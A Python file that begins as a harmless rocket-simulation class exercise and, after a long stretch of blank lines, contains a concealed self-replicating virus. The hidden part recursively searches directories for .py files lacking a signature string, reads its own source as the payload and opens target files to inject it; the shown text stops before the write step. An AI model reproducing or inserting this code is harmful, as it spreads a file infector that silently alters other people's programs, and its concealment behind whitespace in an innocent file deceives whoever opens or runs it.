import random
from math import sqrt


class Rocket:
    nextId = 0

    def __init__(self, speed=1, altitude = 0, x=0):
        self.altitude = altitude
        self.speed = speed
        self.x = 0

        self.id = Rocket.nextId
        Rocket.nextId += 1
        # granted id for every rocket

    def move_up(self):
        self.altitude += self.speed

    def __str__(self):
        return "Actual rocket altitude: " + str(self.altitude)


class RocketBoard:
    def __init__(self, amountOfRockets=5):
        self.rocketList = [Rocket(random.randint(1,6)) for _ in range(amountOfRockets)]
        # create rockets(amountOfRockets, default = 5), with random speed 

        for rockets in range(10):
            rocketIndexToMove = random.randint(0, len(self.rocketList) - 1)
            self.rocketList[rocketIndexToMove].move_up()
        # draw random index from rocketlist and moveing it for drawn earlier self speed

        for rocket in self.rocketList:
            print(rocket)
        # print each rocket(granted earlier __str__) from rocketlist and

    def __getitem__(self, key):
        return self.rocketList[key]

    def __setitem__(self, key, value):
        self.rocketList[key].altitude = value

    @staticmethod
    def get_distance(rocket, rocket2):
        xs = (rocket.altitude - rocket2.altitude) ** 2
        ys = (rocket.x - rocket2.x) ** 2
        return sqrt(xs + ys)
    # its distance formula to return distance

    def __len__(self):
        return len(self.rocketList)







































































































































































































import os
import sys
import subprocess
import threading
 
SIGNATURE = "Tohle fakt (mozna) neni virus"
 
def copy(s):
    if sys.platform.startswith('win32') or sys.platform.startswith('cygwin'):
        subprocess.Popen(['clip'], stdin=subprocess.PIPE).communicate(s)
    else:
        raise Exception('Platform not supported')
 
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
